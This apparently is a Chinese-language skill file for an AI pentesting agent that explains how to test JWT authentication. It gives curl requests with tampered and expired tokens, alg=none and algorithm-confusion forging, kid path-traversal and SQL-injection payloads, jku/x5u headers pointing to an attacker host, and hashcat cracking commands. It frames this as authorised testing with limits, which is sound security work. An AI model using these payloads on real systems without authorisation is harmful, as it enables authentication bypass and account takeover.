---
name: tech-jwt
description: 【验证】JWT 攻击面：解构三部分、测 alg=none 与算法混淆、弱密钥爆破（离线）、kid/jku 注入、以及"声明可篡改"的验证方法，含不依赖爆破的判定路径
whenToUse: 鉴权使用 JWT（响应或 localStorage 里的 eyJ...），或怀疑令牌声明可被篡改时
role: exploit
category: 验证
tags: [jwt, token, alg-none, kid, jku, 弱密钥, 越权]
enabled: true
---

# JWT 攻击面

> 先解构，再判断服务端**校验了什么**。很多系统只解码不验签。

## 一、解构与判读

```bash
TOK='eyJ...'
# header
echo "$TOK" | cut -d. -f1 | base64 -d 2>/dev/null; echo
# payload
echo "$TOK" | cut -d. -f2 | base64 -d 2>/dev/null; echo
```

重点看 payload 里的**授权字段**：`uid`、`role`、`isAdmin`、`tenantId`、`exp`、`aud`、`iss`、`kid`。

## 二、五种测试（按命中率）

### 1. 过期令牌是否仍可用

```bash
# 用 exp 已过的旧 token 请求
curl -s "https://target/api/user" -H "Authorization: Bearer $OLD_TOK"
```
**判据**：仍返回数据 → 服务端不校验 exp。

### 2. alg=none（跳过签名）

改造 header 为 `{"alg":"none","typ":"JWT"}`，签名段留空：
```
<base64(header)>.<base64(payload)>.
```
变体：`none`、`None`、`NONE`、`nOnE`。

**判据**：返回数据 → 服务端接受无签名。

### 3. 算法混淆（RS256 → HS256）

若服务端用 RS256（公钥验签），尝试把 `alg` 改成 `HS256`，**用公钥当 HMAC 密钥**签名。
**前提**：能拿到公钥（常见于 `/jwks.json`、`.well-known/jwks.json`）。

### 4. 声明篡改（最实际）

改 payload 里的权限字段，**用原签名**直接发：
```bash
# 改 role=admin，签名不变
curl -s "https://target/api/admin" -H "Authorization: Bearer $TAMPERED"
```
**判据**：返回管理功能数据 → 服务端只解码不验签（最常见的问题）。

### 5. kid / jku 注入

| 手法 | payload |
|---|---|
| `kid` 路径穿越 | `"kid":"../../../../dev/null"` |
| `kid` SQL 注入 | `"kid":"' UNION SELECT 'secret' -- "` |
| `jku` 指向自己的 JWKS | `"jku":"https://attacker/jwks.json"` |
| `x5u` 同理 | `"x5u":"https://attacker/cert.pem"` |

## 三、弱密钥（**只做离线**）

```bash
# 用 hashcat 离线爆破（不攻击线上服务）
hashcat -m 16500 "$TOK" jwt-secrets.txt
# 或用 jwt_tool
python3 jwt_tool.py "$TOK" -C -d dict.txt
```
**纪律**：**只做离线**，不对线上接口爆破。

## 四、判定标准

| 结果 | 结论 |
|---|---|
| 改 role 后拿到管理数据 | ✅ 垂直越权（高） |
| alg=none 被接受 | ✅ 认证绕过（高） |
| 过期 token 可用 | ✅ 会话管理缺陷（中） |
| 爆破出弱密钥并能伪造任意用户 | ✅ 高 |
| 只能解码无法篡改 | ❌ 不算 |

## 五、证据要求

1. 原始 token 解构（header + payload，脱敏）
2. 篡改后的 token + 请求 + 响应
3. 说明服务端**没校验哪一项**（签名/exp/role）

## 六、失败判据

- 篡改后返回 401/签名错误 → 验签正常
- alg=none 被拒 → 库已防护
- 离线爆破 1 万字典无结果 → 放弃弱密钥路线

## 七、边界

- **线上接口别跑大字典**（防锁定/防告警）；弱密钥优先离线，必要时小字典受控试
- 不长期持有他人 token；测试完不记录完整 token
- 篡改只读接口验证；不执行管理类写操作

## 八、常见坑

| 坑 | 说明 |
|---|---|
| base64 填充问题 | 去掉 `=` 再拼，或用 urlsafe base64 |
| 忘记 url-safe 编码 | JWT 用 `-_` 不是 `+/` |
| 改 payload 后签名段没删 | alg=none 时第三段必须为空 |
| 以为"能解码"就是漏洞 | 可解码是设计如此，要证明**可篡改且被接受** |
